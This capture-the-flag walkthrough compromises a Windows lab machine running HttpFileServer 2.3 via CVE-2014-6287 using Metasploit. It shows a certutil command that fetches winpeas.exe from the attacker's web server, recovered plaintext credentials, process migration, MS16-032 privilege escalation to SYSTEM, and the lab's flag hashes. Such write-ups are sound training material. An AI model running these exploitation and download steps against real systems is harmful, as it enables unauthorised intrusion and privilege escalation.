We find a service running on port 80, `HttpFileServer version 2.3`
We find this common vulnerability, it takes advantage of the `findMacroMaker` function within `HttpFileServer version 2.3`

https://nvd.nist.gov/vuln/detail/CVE-2014-6287 - `CVE-2014-6287`

We run the exploit in Metasploit

```php
exploit/windows/http/rejetto_hfs_exec
```

We get a low user shell, we are able to find the user flag

```php
a589deb32b1b8f58a887b63e79e39066
```

I start up a web server to host the file for `winpeas.exe`, have our low level shell download and run it. 

```php
certutil -urlcache -split -f http://10.10.14.209:8080/winpeas.exe winpeas.exe
```

We get the default login for the user.

```php
kostas:kdeEjDowkS*
```

We background this process, its running as session 1. 

The default process is running the shell as `x32` architecture, its best to switch over to the `x64` process
Lets find the `explorer.exe` PID so we can migrate

```php
ps aux | grep explorer

PID   PPID  Name          Arch 
---   ----  ----          ---- 
2084  2076  explorer.exe  x64 
```

Okay time to migrate

```php
migrate 2084
```

There is a module to help us find a path towards privilege escalation 

```php
exploit/windows/local/ms16_032_secondary_logon_handle_privesc
```

We now have root on the machine

```php
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

And finally here's the admin root flag

```php
4cfccb0e5e56aefb7ef5080c54bb266a
```

